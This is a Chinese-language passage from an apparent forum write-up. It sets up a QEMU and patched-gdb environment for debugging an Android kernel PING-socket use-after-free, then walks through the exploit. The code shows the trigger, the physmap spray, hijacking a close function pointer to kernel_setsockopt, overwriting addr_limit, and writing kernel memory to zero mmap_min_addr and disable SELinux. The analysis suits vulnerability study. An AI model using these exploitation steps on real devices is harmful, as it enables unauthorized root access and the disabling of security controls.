
```
./qemu-system-aarch64 -cpu cortex-a57 -machine type=ranchu -m 1024 -append 'console=ttyAMA0,38400 keep_bootcon earlyprintk=ttyAMA0' -serial mon:stdio -kernel Image -initrd /home/hjy/Desktop/android-problem-env/ramdisk.img -drive index=0,id=sdcard,file=/home/hjy/Desktop/android-problem-env/system.img -device virtio-blk-device,drive=sdcard -drive index=1,id=userdata,file=/home/hjy/Desktop/android-problem-env/.//userdata.img -device virtio-blk-device,drive=userdata -drive index=2,id=cache,file=/home/hjy/Desktop/android-problem-env/cache.img -device virtio-blk-device,drive=cache -drive index=3,id=system,file=/home/hjy/Desktop/android-problem-env/system.img -device virtio-blk-device,drive=system -netdev user,id=mynet -device virtio-net-device,netdev=mynet -show-cursor -nographic -L lib/pc-bios -gdb tcp::1234,ipv4 –S
```

这里又有一个很坑的地方，用NDK里面的gdb去调试会报Remote 'g' packet reply is too long，需要我们自己修改gdb源代码并且编译[9]。

```
git clone ed5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2L8X3c8J5L8$3W2V1i4K6u0W2k6$3!0G2k6$3I4W2M7$3!0#2M7X3y4W2i4K6u0W2j5$3!0E0i4K6u0r3N6r3!0G2L8r3y4Z5j5h3W2F1i4K6u0r3k6$3c8T1i4K6u0W2k6$3W2@1
```

下载下来发现有`gdb-7.11`和`gdb-8.0.1`两个文件夹，由于pwndbg和GEF等插件目前好像还不支持gdb 8.x，所以我们选择`gdb-7.11`。找到`gdb-7.11/gdb`目录下的`remote.c`文件，注释掉这两行。

```
  if (buf_len > 2 * rsa->sizeof_g_packet)

     error (_(“Remote ‘g’ packet reply is too long: %s”), rs->buf);
```

在后面加上下面这几行。

```
  if (buf_len > 2 * rsa->sizeof_g_packet) 

   {

      rsa->sizeof_g_packet = buf_len ;

      for (i = 0; i < gdbarch_num_regs (gdbarch); i++)

      {

         if (rsa->regs[i].pnum == -1)

         continue;



         if (rsa->regs[i].offset >= rsa->sizeof_g_packet)

         rsa->regs[i].in_g_packet = 0;

         else

         rsa->regs[i].in_g_packet = 1;

      }

   }
```

编译安装。

```
./configure --target=aarch64-linux-androideabi --prefix=/home/hjy/Desktop/gdb_build/gdb/gdb-7.11/arm-linux

make

make install

```

安装GEF，因为很多人说pwndbg比较卡而GEF不卡。

```
wget -q -O- fbfK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6Z5N6h3N6K6P5g2)9J5c8X3N6W2k6W2)9J5c8Y4u0S2N6#2)9J5c8X3#2S2M7%4c8W2M7W2)9J5c8Y4y4U0M7X3W2H3N6s2y4Q4x3V1k6Y4k6h3k6Q4x3X3g2K6K9q4)9J5y4X3&6T1M7%4m8Q4x3@1u0Q4y4@1y4Q4x3U0k6F1j5Y4y4H3i4K6y4n7M7$3R3`.
```

终于开始调试了，不过还有一个小坑，我们应该用`gef-remote -q localhost:1234`也就是加上`-q`参数不然会报错，原因在这里[7]。接下来进入漏洞利用的部分。我们可以看到在`main`函数中整个漏洞触发漏洞的过程和POC中一样。

```
vultrig_socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);

ret = connect(vultrig_socks[i], &addr1, sizeof(addr1));

system("echo 4096 > /proc/sys/vm/mmap_min_addr");

void* user_mm = mmap(PAGE_SIZE, MAX_NULLMAP_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE| MAP_FIXED |MAP_ANONYMOUS, -1, 0);

ret = connect(vultrig_socks[i], &addr2, sizeof(addr2));

ret = connect(vultrig_socks[i], &addr2, sizeof(addr2));
```

修改`mmap_min_addr`并`mmap`就是为了避免崩溃这样才能执行到`sock_put`的逻辑。接下来的操作叫做physmap spray，大家如果对CVE-2014-3153(towelroot)还有印象的话，会记得它是通过`sendmmsg`修改内核数据的，keen在文章中解释了，通过`sendmmsg`完成堆喷的条件是存在漏洞的对象大小必须和SLAB分配器通常使用的大小一致。而在一些android设备上，PING sock对象的大小是576，不是期望的512或者1024。这样就很难对齐，利用会很不稳定，所以采用的是physmap spray的方法。

![](https://bbs.kanxue.com/upload/attach/201807/734571_ZB3K4FS37Z46RWP.png)

![](https://bbs.kanxue.com/upload/attach/201807/734571_R2FVFDKUUNGP49V.png)

在内核中physmap在一个相对较高的地址，而SLAB通常在一个相对较低的地址，通过喷射其它的内核对象使得SLAB分配器在相对高的地址分配PING sock对象造成physmap和SLAB重叠，这个过程叫做lifting。这里的“其它的内核对象”直接用PING sock对象其实就可以。

![](https://bbs.kanxue.com/upload/attach/201807/734571_4UFXJDUC83WR3YH.png)![](https://bbs.kanxue.com/upload/attach/201807/734571_VAGPEABSDDGMAD2.png)

然后释放掉用来做lifting的PING sock对象，和physmap重叠的那一部分则留做触发漏洞。那么怎样才能知道什么时候PING sock对象已经被physmap中的数据填充了可以停止喷射以及怎样找到已经被填充的PING sock对象呢？在physmap spray中进行了大量的mmap操作，并且将`mapped_page+0x1D8`处赋值为`MAGIC_VALUE+physmap_spray_pages_count`，接下来`search_exploitable_socket`的时候用`ioctl`一个一个去试。

```
ioctl(exp_sock, SIOCGSTAMPNS, &time);
```

这里的`time`是`timespec`结构体，会调用到`sock_get_timestampns`。

```
int sock_get_timestampns(struct sock *sk, struct timespec __user *userstamp)

{

	struct timespec ts;

	if (!sock_flag(sk, SOCK_TIMESTAMP))

		sock_enable_timestamp(sk, SOCK_TIMESTAMP);

	ts = ktime_to_timespec(sk->sk_stamp);

	if (ts.tv_sec == -1)

		return -ENOENT;

	if (ts.tv_sec == 0) {

		sk->sk_stamp = ktime_get_real();

		ts = ktime_to_timespec(sk->sk_stamp);

	}

	return copy_to_user(userstamp, &ts, sizeof(ts)) ? -EFAULT : 0;

}

EXPORT_SYMBOL(sock_get_timestampns);
```

这个函数会返回`sk->sk_stamp`，在我们的环境中它在sock对象中的偏移正是`0x1D8`。

![](https://bbs.kanxue.com/upload/attach/201807/734571_N7VC3GP7KWNWDEC.png)

找到`exp_sock`之后因为它已经完全在我们的控制之中了，所以函数指针也是可控的，对其调用`close`函数就可以控制PC了。可以看到`close`是在`inet_close`中调用的。

```
int inet_release(struct socket *sock)

{

	struct sock *sk = sock->sk;



	if (sk) {

		long timeout;



		sock_rps_reset_flow(sk);



		/* Applications forget to leave groups before exiting */

		ip_mc_drop_socket(sk);



		/* If linger is set, we don't return until the close

		 * is complete.  Otherwise we return immediately. The

		 * actually closing is done the same either way.

		 *

		 * If the close is due to the process exiting, we never

		 * linger..

		 */

		timeout = 0;

		if (sock_flag(sk, SOCK_LINGER) &&

		    !(current->flags & PF_EXITING))

			timeout = sk->sk_lingertime;

		sock->sk = NULL;

		sk->sk_prot->close(sk, timeout);

	}

	return 0;

}

EXPORT_SYMBOL(inet_release);
```

![](https://bbs.kanxue.com/upload/attach/201807/734571_74B5ZQZSVPF92MQ.png)

找一下发现偏移是`0x28`，所以我们将`payload+0x28`设置为`payload`的地址，将`payload`开头设置为`0xFFFFFFC00035D788`让它跳到`kernel_setsockopt`。

![](https://bbs.kanxue.com/upload/attach/201807/734571_CQWFBRYTYEG48UW.png)

```
	   *(unsigned long *)((char *)payload + 0x28)  = (unsigned long)payload;

	   *(unsigned long *)((char *)payload)         = (unsigned long)0xFFFFFFC00035D788;

	   *(unsigned long *)((char *)payload + 0x68)  = (unsigned long)0xFFFFFFC00035D7C0;

	   close(exp_sock);
```

`addr_limit`规定了特定线程的用户空间地址最大值，超过这个值的地址用户空间代码不能访问。所以把`addr_limit`改成`0xffffffff`就可以对内核为所欲为了。现在我们已经来到了`kernel_setsockopt`，应该怎么改`addr_limit`呢？当内核需要去使用系统调用的时候就要去掉地址空间的限制，一般的流程是(1)`oldfs=get_fs()`，(2)`set_fs(KERNEL_DS)`，(3)`set_fs(oldfs)`，如果能绕过`set_fs(oldfs)`的执行，内核空间将一直对用户态打开，这样就绕过了限制。

```
int kernel_setsockopt(struct socket *sock, int level, int optname,

			char *optval, unsigned int optlen)

{

	mm_segment_t oldfs = get_fs();

	char __user *uoptval;

	int err;



	uoptval = (char __user __force *) optval;



	set_fs(KERNEL_DS);

	if (level == SOL_SOCKET)

		err = sock_setsockopt(sock, level, optname, uoptval, optlen);

	else

		err = sock->ops->setsockopt(sock, level, optname, uoptval,

					    optlen);

	set_fs(oldfs);

	return err;

}

EXPORT_SYMBOL(kernel_setsockopt);



#define set_fs(x)	(current_thread_info()->addr_limit = (x))
```

注意这里因为我们控制了`X0`所以`BLR  X5`跳过了`STR  X20, [X19,#8]`。

![](https://bbs.kanxue.com/upload/attach/201807/734571_TG9KKNCFPHGA6GD.png)

![](https://bbs.kanxue.com/upload/attach/201807/734571_DRD3G7HU6YAHJ4Y.png)

截一张mosec2016上360冰刃实验室讲的《Android Root利用技术漫谈：绕过PXN》[5]中的一张图帮助理解。

![](https://bbs.kanxue.com/upload/attach/201807/734571_AVKQDGEJ76MHK2W.png)

现在可以任意读写内核了，下一步是修改全局`mmap_min_addr`让我们能够在用户态`mmap null`地址。

```
	   /*

	      overwrite the global variable mmap_min_addr to 0, then we can mmap NULL in user-mode 

	   */

	   data8 = 0; 

	   kernel_write8((void *)0xffffffc000652148, &data8);

	   user_mm = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE| MAP_FIXED |MAP_ANONYMOUS, -1, 0);

	   if(MAP_FAILED == user_mm)

	   {

	      perror("[*] mmap NULL fail");

	      return -1;

	   }
```

这个地址应该怎么找呢，注意到`setup_arg_pages`中有`mmap_min_addr`。

![](https://bbs.kanxue.com/upload/attach/201807/734571_PZ3DEDEBDN7Y9VN.png)

![](https://bbs.kanxue.com/upload/attach/201807/734571_QRVV67RVHG67YRP.png)

`0xFFFFFFC00063EE9F+0x132A9=0xFFFFFFC000652148`，就是这么来的。接下来关掉selinux，方法同上。

```
	   /*

	      overwirte selinux_enforcing to disable selinux

	   */

	   data4 = 0;

	   kernel_write4((void *)0xffffffc00065399c, &data4);

	   printf("[*] selinux disabled.\n");

```
